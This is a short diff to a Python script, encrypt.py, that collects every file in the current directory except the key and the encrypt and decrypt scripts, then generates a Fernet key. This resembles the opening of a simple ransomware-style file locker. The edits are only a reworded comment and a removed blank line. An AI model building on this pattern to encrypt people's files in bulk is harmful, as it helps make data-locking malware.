@@ -3,7 +3,7 @@ from cryptography.fernet import Fernet
 
 files = []
 
-# adding files to array to encrypt
+# adding all files in the current directory to an array to encrypt
 for file in os.listdir():
 	# add the files to encrypt except these files
 	if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":
@@ -11,7 +11,6 @@ for file in os.listdir():
 	# only add files and not directories
 	if os.path.isfile(file):
 		files.append(file)
-
 print(files)
 
 key = Fernet.generate_key()
